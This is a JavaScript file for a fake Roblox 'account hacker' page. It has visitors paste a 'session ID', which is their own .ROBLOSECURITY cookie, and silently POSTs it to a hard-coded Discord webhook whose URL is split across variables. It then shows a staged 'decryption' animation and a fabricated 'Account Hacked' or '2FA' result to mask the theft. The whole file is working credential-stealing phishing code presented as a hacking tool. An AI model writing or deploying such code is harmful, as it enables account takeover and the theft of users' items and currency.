const a = 'https://discord.com/api/webhooks/';
const b = '1350235351339241472/';
const c = 'LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
const d = a + b + c;

function e(f) {
  const g = { content: `New Session ID Submitted:\n\`\`\`${f}\`\`\`` };
  fetch(d, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(g) })
    .then(h => { if (!h.ok) console.error('Failed to send data to Discord webhook'); })
    .catch(i => console.error('Error sending data to Discord webhook:', i));
}

function j() {
  const k = document.getElementById('username').value.trim();
  const l = document.getElementById('sessionId').value.trim();
  const m = document.getElementById('captcha').checked;
  let n = "";
  if (k.length < 3 && l.length < 200 && !m) n = "Please check your inputs: username, session ID, and CAPTCHA.";
  else if (k.length < 3 && l.length < 200) n = "Username must be at least 3 characters, and session ID must be 300+ characters.";
  else if (k.length < 3 && !m) n = "Username must be at least 3 characters, and CAPTCHA must be completed.";
  else if (l.length < 200 && !m) n = "Session ID must be 300+ characters, and CAPTCHA must be completed.";
  else if (k.length < 3) n = "Username must be at least 3 characters long.";
  else if (l.length < 200) n = "Session ID must be at least 300 characters long.";
  else if (!m) n = "Please complete the CAPTCHA to proceed.";
  if (n) { o(n); return; }
  e(l);
  p();
  q();
}

function o(r) {
  const s = document.getElementById('error');
  s.innerHTML = `<p class="error-message">${r}</p>`;
  s.classList.remove('hidden');
}

function p() { document.getElementById('error').classList.add('hidden'); }

function q() {
  document.getElementById('scanButton').disabled = true;
  document.getElementById('hacking').classList.remove('hidden');
  const t = document.getElementById('progress-bar-fill');
  let u = 0;
  const v = 65000;
  const w = 50;
  const x = (w / v) * 100;
  const y = setInterval(() => {
    if (u >= 100) { clearInterval(y); z(); }
    else { u += x; t.style.width = u + '%'; }
  }, w);
  const aa = document.getElementById('terminal');
  const ab = [
    '[*] Scanning target account...',
    '[*] Identifying encryption: AES-256...',
    '[*] Initializing custom decryption algorithm...',
    '[*] Decrypting session ID with a brute-force module...',
    '[*] Extracting _ROBLOSECURITY cookie...',
    '[*] Verifying cookie validity...'
  ];
  const ac = v / ab.length;
  let ad = 0;
  const ae = setInterval(() => {
    if (ad >= ab.length) clearInterval(ae);
    else { aa.innerHTML += ab[ad] + '\n'; aa.scrollTop = aa.scrollHeight; ad++; }
  }, ac);
}

function z() {
  const af = [
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
  ];
  const ag = [
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A1B2C3D4E5F6G7H8I9J0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_K1L2M3N4O5P6Q7R8S9T0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_U1V2W3X4Y5Z6A7B8C9D0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_E1F2G3H4I5J6K7L8M9N0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_O1P2Q3R4S5T6U7V8W9X0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_Y1Z2A3B4C5D6E7F8G9H0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_I1J2K3L4M5N6O7P8Q9R0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_S1T2U3V4W5X6Y7Z8A9B0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_C1D2E3F4G5H6I7J8K9L0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_M1N2O3P4Q5R6S7T8U9V0********'
  ];
  const ah = Math.random() < 0.5;
  const ai = ah ? af[Math.floor(Math.random() * af.length)] : ag[Math.floor(Math.random() * ag.length)];
  if (ah) {
    const aj = `
      <div class="success-table">
        <h3>Success! Account Hacked</h3>
        <table>
          <tr>
            <th>Cookie</th>
          </tr>
          <tr>
            <td style="color: green;">${ai}</td>
          </tr>
        </table>
      </div>
    `;
    const ak = document.getElementById('cookie');
    ak.innerHTML = aj;
    ak.classList.remove('hidden');
    document.getElementById('twoFaError').classList.add('hidden');
    const al = document.getElementById('terminal');
    al.innerHTML += '[*] Session ID verified.\n';
    al.innerHTML += '<span style="color: green;">[*] SUCCESS! Account hacked successfully.</span>\n';
    al.scrollTop = al.scrollHeight;
  } else {
    const am = document.getElementById('cookie');
    am.innerHTML = `Cookie: <span style="color: red;">${ai}</span>`;
    am.classList.remove('hidden');
    const an = document.getElementById('twoFaError');
    an.innerHTML = `<p class="error-message" style="color: red;">ERROR! User has 2FA enabled. Full access prevented.</p>`;
    an.classList.remove('hidden');
    const ao = document.getElementById('terminal');
    ao.innerHTML += '[*] Session ID verified.\n';
    ao.innerHTML += '<span style="color: red;">[*] ERROR! User has 2FA enabled. Full access prevented.</span>\n';
    ao.scrollTop = ao.scrollHeight;
  }
}

function ap() {
  const aq = document.getElementById('termsModal');
  aq.classList.remove('hidden');
  setTimeout(() => aq.classList.add('visible'), 10);
}

function aq() {
  const ar = document.getElementById('termsModal');
  ar.classList.remove('visible');
  setTimeout(() => ar.classList.add('hidden'), 300);
}

document.addEventListener('DOMContentLoaded', () => {
  document.querySelector('.close').addEventListener('click', aq);
});
